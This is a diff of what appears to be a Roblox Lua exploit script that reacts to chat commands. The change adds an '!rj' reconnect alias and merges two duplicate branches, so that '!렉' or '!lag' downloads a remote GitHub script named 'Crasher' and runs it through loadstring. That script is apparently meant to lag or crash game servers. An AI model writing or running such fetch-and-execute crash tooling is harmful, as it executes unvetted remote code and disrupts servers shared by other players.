@@ -10,7 +10,7 @@ game:GetService("StarterGui"):SetCore("SendNotification", {
 })
 
 lp.Chatted:Connect(function(msg)
-    if msg == "!재접" then
+    if msg == "!재접" or msg == "!rj" then
         print("서버 재접속을 시도합니다...")
         
         local success, err = pcall(function()
@@ -25,17 +25,7 @@ lp.Chatted:Connect(function(msg)
             warn("재접속 중 오류 발생: " .. tostring(err))
         end
 
-    elseif msg == "!렉" then
-        local success, err = pcall(function()
-            loadstring(game:HttpGet("https://raw.githubusercontent.com/dosi1100-cmyk/script/refs/heads/main/Crasher"))()
-        end)
-        
-        if not success then
-            warn("스크립트 실행 실패: " .. tostring(err))
-        end
-    end
-
-    if msg == "!lag" then
+    elseif msg == "!렉" or msg == "!lag" then
         local success, err = pcall(function()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/dosi1100-cmyk/script/refs/heads/main/Crasher"))()
         end)
